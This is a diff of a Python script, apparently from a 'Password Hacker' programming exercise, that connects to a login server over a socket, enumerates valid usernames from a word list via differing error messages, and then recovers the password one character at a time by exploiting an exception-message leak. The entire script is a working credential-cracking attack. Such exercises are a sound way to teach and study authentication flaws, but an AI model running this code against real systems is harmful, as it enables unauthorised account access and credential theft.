@@ -1,33 +1,46 @@
-from itertools import count, combinations_with_replacement, chain, product
 import socket
 import argparse
 import string
+import json
+
+WRONG_LOGIN = "Wrong login!"
+WRONG_PW = "Wrong password!"
+EXCEPTION = "Exception happened during login"
+SUCCESS = "Connection success!"
+PW_CHARS = string.ascii_letters + string.digits
 
 
-def generate_passwords(length):
-    alphabet = string.ascii_lowercase + string.digits
-    return combinations_with_replacement(alphabet, length)
+def try_login(client, login):
+    data = {'login': login, 'password': ' '}
+    client.send(json.dumps(data).encode())
+    resp = json.loads(client.recv(256).decode())
+    if resp['result'] == WRONG_PW:
+        return True
 
 
-def generate_all_passwords():
-    passwords = chain.from_iterable(generate_passwords(length)
-                                    for length in count(1))
-    return (''.join(password) for password in passwords)
+def crack_login(client, login_file):
+    for login in map(str.strip, login_file):
+        if try_login(client, login):
+            return login
 
 
-def pw_case_permutations(password):
-    cases = [{char, char.upper()} for char in password]
-    permutations = product(*cases)
-    return (''.join(permutation) for permutation in permutations)
+def try_pass(client, login, attempt):
+    data = {'login': login, 'password': attempt}
+    client.send(json.dumps(data).encode())
+    resp = json.loads(client.recv(256).decode())
+    return resp['result']
 
 
-def try_password(password, client):
-    for permutation in pw_case_permutations(password):
-        client.send(permutation.encode())
-        response = client.recv(32).decode()
-        if response == 'Connection success!':
-            return True, permutation
-    return False, None
+def crack_pass(client, login):
+    sub_pass = ''
+    while True:
+        for char in PW_CHARS:
+            attempt = sub_pass + char
+            result = try_pass(client, login, attempt)
+            if result == EXCEPTION:
+                sub_pass = attempt
+            elif result == SUCCESS:
+                return attempt
 
 
 def main():
@@ -35,15 +48,14 @@ def main():
     arg_parser.add_argument('IP_address')
     arg_parser.add_argument('port', type=int)
     cli_args = arg_parser.parse_args()
-    path = 'C:/Users/Julian/PycharmProjects/Password Hacker/Password ' \
-           'Hacker/task/hacking/passwords.txt'
-    with socket.socket() as client, open(path) as pw_file:
+    login_path = ('C:/Users/Julian/PycharmProjects/Password Hacker'
+                  '/Password Hacker/task/hacking/logins.txt')
+
+    with socket.socket() as client, open(login_path) as login_file:
         client.connect((cli_args.IP_address, cli_args.port))
-        for password in map(str.strip, pw_file):
-            cracked, pw = try_password(password, client)
-            if cracked:
-                print(pw)
-                break
+        login = crack_login(client, login_file)
+        password = crack_pass(client, login)
+        print(json.dumps({'login': login, 'password': password}))
 
 
 if __name__ == '__main__':
